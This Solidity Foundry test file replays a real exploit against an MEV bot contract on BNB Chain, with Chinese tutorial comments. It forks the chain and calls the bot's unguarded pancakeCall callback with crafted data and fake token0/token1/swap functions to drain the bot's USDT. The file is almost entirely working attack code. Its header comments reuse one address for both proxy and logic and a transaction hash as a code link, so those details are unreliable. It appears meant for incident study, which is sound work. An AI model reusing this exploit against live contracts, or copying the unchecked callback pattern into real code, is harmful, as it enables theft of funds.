// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "./interfaces/IPancakePair.sol";
import "./interfaces/IPancakeRouter.sol";
import "./interfaces/IEGD_Finance.sol";
import "./interfaces/IERC20.sol";
import "./interfaces/cheat.sol";

interface IMEVBot {
    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes memory data) external;
}

// @KeyInfo - Total Lost : ~14,000 US$
// Attacker : 0xEE286554F8b315F0560A15b6f085dDad616D0601
// Attack Contract : 0xEE286554F8b315F0560A15b6f085dDad616D0601
// Vulnerable Contract : 0x64dD59D6C7f09dc05B472ce5CB961b6E10106E1d (Proxy)
// Vulnerable Contract : 0x64dD59D6C7f09dc05B472ce5CB961b6E10106E1d (Logic)
// Attack Tx : https://bscscan.com/tx/0xd48758ef48d113b78a09f7b8c7cd663ad79e9965852e872fdfc92234c3e598d2

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xd48758ef48d113b78a09f7b8c7cd663ad79e9965852e872fdfc92234c3e598d2#code#F1#L254
// Stake Tx : https://bscscan.com/tx/0xd48758ef48d113b78a09f7b8c7cd663ad79e9965852e872fdfc92234c3e598d2
// Decompiled Code: https://app.dedaub.com/decompile?md5=58c948aa3e23b09bc625f06f37f93c7f

// 宣告全局變量, 必須為 constant 類型
CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
address constant MEVBot = 0x64dD59D6C7f09dc05B472ce5CB961b6E10106E1d;
address constant usdt = 0x55d398326f99059fF775485246999027B3197955;
address constant busd = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
address constant wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

contract Attacker is Test { // 模擬的攻擊者(EOA)
    address public _token0;
    address public _token1;
    constructor() { // 也可以寫成 function setUp() public {}
        // label 可以將錢包地址標籤化，方便在使用 forge test -vvvv 時提高可讀性
        cheat.label(MEVBot,"MEVBot");
        cheat.label(busd, "BUSD");
        cheat.label(usdt, "USDT");
        cheat.label(wbnb, "WBNB");
        /* ------------------------------------------------------------------------------------------- */
        vm.rollFork(21297409);
        console.log("-------------------------------- Start Exploit ----------------------------------");
    }

    function testExploit() public { // 必須為 test 開頭命名, 才能被 Foundry 執行 testcase
        // 攻擊前, 先 print 出餘額, 已便於更好的觀察 balance 變化
        emit log_named_decimal_uint("[Start] Attacker USDT Balance", IERC20(usdt).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[Start] Attacker WBNB Balance", IERC20(wbnb).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[Start] Attacker BUSD Balance", IERC20(busd).balanceOf(address(this)), 18);

        uint256 usdt_amount = IERC20(usdt).balanceOf(address(MEVBot));
        (_token0,_token1) = (address(usdt),address(usdt));
        IMEVBot(MEVBot).pancakeCall(address(MEVBot), usdt_amount, 0, abi.encodePacked(bytes12(0),bytes20(address(this)),bytes32(0),bytes32(0)));


        console.log("-------------------------------- End Exploit ----------------------------------");
        emit log_named_decimal_uint("[End] Attacker USDT Balance", IERC20(usdt).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[End] Attacker WBNB Balance", IERC20(wbnb).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[End] Attacker BUSD Balance", IERC20(busd).balanceOf(address(this)), 18);
    }

    function token0() public view returns (address) {
        return _token0;
    }
    function token1() public view returns(address )  {
      return _token1;
    }

    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) public {}
}